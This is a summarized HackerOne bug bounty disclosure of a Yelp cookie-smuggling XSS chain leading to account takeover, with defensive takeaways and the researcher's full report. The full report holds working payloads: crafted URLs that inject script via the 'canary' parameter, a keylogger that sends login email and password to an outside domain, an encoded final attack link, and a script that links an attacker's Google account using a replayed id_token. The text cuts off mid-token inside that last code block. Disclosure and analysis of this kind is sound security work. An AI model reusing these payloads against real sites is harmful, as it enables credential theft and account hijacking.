# Yelp XSS via Cookie Smuggling Leading to Account Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 2010530 | https://hackerone.com/reports/2010530
- **Submitted:** 2023-06-02
- **Reporter:** lil_endian
- **Program:** Yelp
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (XSS), Improper Cookie Parsing, HTTP Response Splitting, Credential Theft, Account Takeover
- **CVEs:** None
- **Category:** web-api

## Summary
Yelp reflects unescaped cookie values in HTML and allows cookies to be set via query parameters. An attacker can exploit broken cookie parsing that splits on spaces instead of semicolons to smuggle a malicious XSS payload into the 'guvo' cookie, resulting in persistent XSS in a victim's browser. This enables credential harvesting on the business login page and unauthorized account linking via Google OAuth.

## Attack scenario
1. Attacker crafts a malicious URL with ?canary parameter containing a guvo cookie injection payload: ?canary=asdf%20guvo%3D%3C/script%3E%3Cscript%3E[malicious_js]%3C/script%3E
2. Victim clicks the attacker's link or is redirected to yelp.com with the crafted URL
3. Server sets yelpmainpaastacanary cookie with smuggled guvo cookie due to broken space-based parsing
4. Cookie includes Max-Age=99999999 ensuring persistence across sessions and domains
5. XSS payload executes on subsequent visits to www.yelp.com or when victim navigates to biz.yelp.com/login
6. Keylogger intercepts credentials, or attacker injects code to link their Google account to victim's Yelp account

## Root cause
Multiple chained vulnerabilities: (1) guvo cookie value not HTML-escaped in response body, (2) server-side cookie parsing uses space delimiters instead of RFC-compliant semicolon parsing, (3) Set-Cookie headers can be controlled via query parameters without validation, allowing cookie injection with arbitrary attributes including Max-Age

## Attacker mindset
Sophisticated approach leveraging multiple weak security controls. Attacker recognized that individual vulnerabilities (cookie reflection, parameter-based cookie setting) were security theater but became exploitable when combined. The use of Max-Age ensures long-term persistence, and the choice of biz.yelp.com/login as POC demonstrates understanding of high-value targets. The credential theft + account linkage approach shows intent to establish durable access.

## Defensive takeaways
- Always HTML-escape all user-controlled data reflected in responses, regardless of perceived trust in data origin
- Implement strict input validation on query parameters that affect Set-Cookie headers; never allow injection of cookie attributes like Max-Age
- Parse cookies according to RFC 6265 using semicolons as delimiters, not custom delimiters like spaces
- Use Content Security Policy (CSP) with strict-dynamic or nonce-based script-src to prevent inline script execution
- Implement SameSite=Strict (not Lax) for sensitive operations; consider additional CSRF protections for state-changing operations
- Apply output encoding context-appropriately (HTML entity encoding for HTML context, JavaScript string encoding for JS context)
- Use HTTP-only and Secure flags on all cookies to prevent XSS exfiltration
- Implement cookie integrity verification (signed cookies) to detect tampering

## Variant hunting
Test all query parameters that can be reflected or set in response headers for injection vectors
Check for custom cookie parsing logic in backend frameworks; compare against standards to find delimiters other than semicolon
Hunt for unescaped cookie reflections in window objects, JSON responses, or HTML attributes
Test whether other response headers (Etag, X-* headers) can be controlled via query parameters
Examine authentication-related pages (login, password reset, account linking) for persistent XSS impact
Look for opportunities to chain XSS with OAuth/social login flows for account takeover
Test cookie-setting mechanisms across all domain variants (www., biz., api., etc.) for scope confusion

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1056.004
- T1539

## Notes
Report demonstrates mature exploitation: researcher used existing CyberChef recipes to ease payload generation, showing social engineering viability. The combination of cookie smuggling + XSS + keylogging + OAuth account linking is a complete ATO chain. Yelp's use of SameSite=Lax (not Strict) was insufficient protection. The persistence mechanism (Max-Age injection) is particularly dangerous as victim remains compromised indefinitely without awareness. Cookie parsing bug likely stemmed from custom implementation rather than using language-native HTTP libraries.

## Full report
<details><summary>Expand</summary>

# Summary:
yelp.com reflects the content of the cookie `guvo` in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a `guvo` cookie inside a cookie named `yelpmainpaastacanary`. The `yelpmainpaastacanary` cookie can be set by including a URL query parameter `?canary=[Cookie value]`  in any request to `*.yelp.com`.

This report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on `https://biz.yelp.com/login` to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via "Sign in with Google".

# Description
## XSS via "guvo" cookie
The value of the cookie `guvo` is reflected (unescaped) on some pages. Most interestingly on the frontpage of `www.yelp.com` and on the login page of `https://biz.yelp.com/login`. The unescaped reflection happens in the `window.ySitRepParams` object and the `window.yelp.guv` property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:
██████████
█████████

## Setting the "yelpmainpaastacanary" cookie
There is a feature on `yelp.com` where by adding the query parameter `?canary=asdf` to a request, the response will contain an HTTP header:
```
Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```
This gives us a way to set the cookie `yelpmainpaastacanary` to any value we want. But we need a way to control the `guvo` cookie. It turns out that we can smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie.

## Broken cookie parsing and cookie smuggeling
The Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like
```
Cookie: a=1; b=2;
```
which should be parsed as 2 cookies `a` and `b`. But if we set a cookie like:
```
Cookie: a=1 b=2;
```
This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`. We can abuse this to smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie by making a request to 
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
████

which sets the cookie
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; 
```
and results in our XSS payload triggering every time we visit the front page of `www.yelp.com`:
{F2394020}

As an added bonus we can also inject a `Max-Age: 99999999` attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

# POCs
_Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains._

## Keylogger on biz.yelp.com/login
This javascript snippet will leak the content of the email and password fields on `https://biz.yelp.com/login` when the user types, or when the login form is submitted. The credentials are leaked to the domain `calc.sh` which I own:
```javascript
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

We create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:
```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
```
Our final link looks like this:
```
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

Anyone visiting that link will have our keylogger installed. Here's a short video showing it in action:
███

## Account takeover by linking a Google account
The request to link a Google account to a Yelp account is done from `https://yelp.com/profile_sharing`. The final request in the Google-link-flow is a POST request to `https://www.yelp.dk/google_connect/register` with CSRF token `csrftok` and a token `id_token` which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.

To generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:
████████

Now that we have a token for the Google accoutn `██████` we can create an XSS payload for a victim. In this code we make a request to `/profile_sharing` and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the `id_token` we prepared:
```javascript
(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTt

</details>

---
*Analysed by Claude on 2026-05-12*
